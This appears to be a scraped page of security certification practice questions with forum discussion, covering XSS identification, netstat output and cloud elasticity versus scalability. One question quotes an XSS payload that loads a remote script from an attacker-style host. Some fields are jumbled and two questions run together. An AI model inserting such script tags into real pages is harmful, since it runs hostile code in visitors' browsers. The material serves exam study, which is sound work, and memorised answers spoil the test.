questions.question_text:
A security engineer is analyzing the following line of JavaScript code that was found in a comment field on a web forum, which was recently involved in a security breach:
<script src=http://gotcha.com/hackme.js></script>
Given the line of code above, which of the following BEST represents the attack performed during the breach?

discussion.content:
The given answer is correct. 
XSS Occurs when an attacker embeds malicious scripting commands on a
trusted website

Keybword cross site request xxs is executed using comment section so the answers is xxs
Fundamental difference is that CSRF (Cross-site Request forgery) happens in authenticated sessions when the server trusts the user/browser, while XSS (Cross-Site scripting) doesn't need an authenticated session and can be exploited when the vulnerable website doesn't do the basics of validating or escaping input.
Whenever you see the words script and .js, think XSS

questions.question_text:
A security analyst is investigating a call from a user regarding one of the websites receiving a 503: Service Unavailable error. The analyst runs a netstat-an command to discover if the web server is up and listening. The analyst receives the following output:
TCP 10.1.5.2:80 192.168.2.112:60973 TIME_WAIT
TCP 10.1.5.2:80 192.168.2.112:60974 TIME_WAIT
TCP 10.1.5.2:80 192.168.2.112:60975 TIME_WAIT
TCP 10.1.5.2:80 192.168.2.112:60976 TIME_WAIT
TCP 10.1.5.2:80 192.168.2.112:60977 TIME_WAIT
TCP 10.1.5.2:80 192.168.2.112:60978 TIME_WAIT
Which of the following types of attack is the analyst seeing?
Which of the following serves to warn users against downloading and installing pirated software on company devices?

comments.content:

questions.question_text: In a corporation where compute utilization spikes several times a year, the Chief Information Officer (CIO) has requested a cost-effective architecture to handle the variable capacity demand. Which of the following characteristics BEST describes what the CIO has requested?

discussion.content: elasticity: whether the workload increase or decrease. scalability: only increase.

Elasticity and scalability refer to the ability to resize computing capacity based on the load. For example, imagine one VM has increased traffic. You can increase the amount of processing power and memory used by this server relatively easily. Similarly, it's relatively easy to decrease the resources when the load decreases.
Source: Get Certified Get Ahead (p.75)
When I think of elasticity, I think of a rubber band that expands to tightly wrap its load, but if the load shrinks, the rubber band also shrinks.

comments.content: Completely agree, the keyword is "variable", which means the application workload can either be increased or decreased; thus, elasticity, instead of scalability. It would be scalability if there was just increase and that's it. The question assumes a broader scope.

discussion.content:
My take on this:
Elasticity - Scales up when resources contention is high and scales down when resrouces are no longer needed.
Scalability - refers more to the ability of the server architecture to be only scaled up as more applications are implemented and more server resources are needed
* Since it is talking just about spikes, you wouldn't want to dedicate full infrastructure for spikes for an application when you provide elasticity to the application and save the money.
or is it that scalability cant be de-provisioned while elasticity can be de-provisioned?

comments.content:
Scalability is like the ability to expand beyond your current baseline IT Setup. 
The keyword in this question is "variable" which is synonymous to fluctating -> elasticity.

discussion.content: I still don't know the fundamental difference between scalability and elasticity. I thought thye both meant the same thing.

questions.answer_description: Elasticity is defined as ג€the degree to which a system is able to adapt to workload changes by provisioning and de-provisioning resources in an autonomic manner, such that at each point in time the available resources match the current demand as closely as possibleג€.
